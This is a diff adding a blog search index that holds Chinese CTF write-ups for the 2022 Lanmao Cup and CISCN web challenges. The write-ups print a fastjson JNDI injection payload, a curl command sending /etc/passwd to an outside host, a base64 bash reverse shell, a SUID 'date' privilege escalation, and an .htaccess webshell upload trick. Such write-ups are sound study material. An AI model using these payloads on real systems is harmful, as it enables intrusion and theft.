@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>蓝帽杯2022_Web_网站取证</title>
+      <link href="/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/"/>
+      <url>/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/</url>
+      
+        <content type="html"><![CDATA[<h1 id="蓝帽杯——Web-amp-网站取证"><a href="#蓝帽杯——Web-amp-网站取证" class="headerlink" title="蓝帽杯——Web&amp;网站取证"></a>蓝帽杯——Web&amp;网站取证</h1><h2 id="Ez-gadget"><a href="#Ez-gadget" class="headerlink" title="Ez_gadget"></a>Ez_gadget</h2><p>&#x2F;json路由下，有个这样的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str != <span class="literal">null</span> &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) </span><br></pre></td></tr></table></figure><p>这个牵扯到hashcode相同，但是字符串不一样，和md5弱碰撞有点像</p><p>找到这个博客：<a href="https://blog.csdn.net/weixin_44245828/article/details/109853439">https://blog.csdn.net/weixin_44245828/article/details/109853439</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301787.png" alt="img"></p><p>根据博客内容将key:BHUCCIx2zF9mMpJ7进行调整，调整为BHUBbIx2zF9mMpJ7</p><p>一个值的ascii差了1，然后紧跟着就整一个ascii大31字母的进行<code>补偿</code>，其余不变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;curl http://ip:7010 -Fe=@/etc/passwd&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301244.png" alt="img"></p><p>发包，注意用unicode编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=xH8b2iQfPbGejJgs&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://ip:1099/cw3nmu&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>尝试外带文件，测试&#x2F;etc&#x2F;passwd</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0063\u0077\u0033\u006e\u006d\u0075&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301428.png" alt="img"></p><p>反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi4yNDAuMTQ4LzcwMTAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301502.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0061\u006f\u006a\u0035\u0072\u0068&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>监听7010端口，反弹shell</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301250.png" alt="img"></p><p>但是权限有问题，根目录下没有flag文件，想到之前的一个提权学习</p><p><a href="https://www.it-sec.fail/jerseyctf-2022-mist-root-me/">JerseyCTF 2022 &#x2F; mist – root-me – it-sec.fail</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301512.png" alt="img"></p><p>模仿打一遍就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">date</span> -f /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301557.png" alt="img"></p><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>顺带写一下部分网站取证部分</p><h3 id="网站取证1"><a href="#网站取证1" class="headerlink" title="网站取证1"></a>网站取证1</h3><p>vscode搜索_POST，发现一句话木马</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122303763.png" alt="img"></p><p>lanmaobei666</p><h3 id="网站取证2"><a href="#网站取证2" class="headerlink" title="网站取证2"></a>网站取证2</h3><p>加密解密处理时 mcrypt_module_open()函数在7.1中被贬低，将在7.2中被移除，要用openssl_decrypt()函数代替。换用php5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="comment">//KBLT123</span></span><br></pre></td></tr></table></figure><p>KBLT123</p><h3 id="网站取证3"><a href="#网站取证3" class="headerlink" title="网站取证3"></a>网站取证3</h3><p>找到加密函数，有个<code>$key</code>，就是salt值</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305575.png" alt="img"></p><p>jyzg123456</p><h3 id="网站取证4"><a href="#网站取证4" class="headerlink" title="网站取证4"></a>网站取证4</h3><p>数据库中的money是加密的，不能直接进行加减，找到解密函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305749.png" alt="img"></p><p>bak.sql数据库中保存有汇率信息</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305792.png" alt="image-20220712230533295"></p><p>转账部分，转账的金额需要用上面的解密函数进行解密，编号2，3，4，5是对应的人员，这一点对应一下即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122306697.png" alt="image-20220712230614304"></p><p>根据这些内容，写脚本算出最终的转账数目即可</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛wp </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 蓝帽杯 </tag>
+            
+            <tag> 2022 </tag>
+            
+            <tag> fastjson </tag>
+            
+            <tag> 网站取证 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ciscn2022华中赛区web部分wp</title>
+      <link href="/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/"/>
+      <url>/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ciscn2022华中分区web部分wp"><a href="#ciscn2022华中分区web部分wp" class="headerlink" title="ciscn2022华中分区web部分wp"></a>ciscn2022华中分区web部分wp</h1><p>[toc]</p><h2 id="FakeUpload1"><a href="#FakeUpload1" class="headerlink" title="FakeUpload1"></a>FakeUpload1</h2><p>题目描述：嘶，长得好像上传呀。提交 flag 格式：flag{xxxx}。URL：http:&#x2F;&#x2F;该题目IP为Web赛题中【ctf赛题环境】的IP:58002</p><p>不是文件上传，是文件读取</p><p>当访问pics&#x2F;1.jpg的时候，url变为了<code>reader.php?filename=pics/1.jpg</code></p><p>所以直接修改报文，读取flag.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122140635.png" alt="image-20220712213531916"></p><h2 id="Identity23"><a href="#Identity23" class="headerlink" title="Identity23"></a>Identity23</h2><p>题目端口58003</p><p>disearch扫描</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150893.png" alt="image-20220712213222584"></p><p>传参，找到一个php  A0ther_hldden_PaGe.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150845.png" alt="img"></p><p>访问  A0ther_hldden_PaGe.php  可以上传文件，有一些防护</p><p>上传<code>.htaccess</code>文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150456.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   </span><br></pre></td></tr></table></figure><p>然后上传，注意修改报文</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150923.png" alt="img"></p><p>传一个图片马1.jpg</p><p>然后蚁剑连接  因为1.jpg是之前上传的图片马，现在被当作php解析了</p><p>蚁剑连接  查看该文件即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150519.png" alt="img"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛wp </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ciscn2022 </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2022/07/11/hello-world/"/>
+      <url>/2022/07/11/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
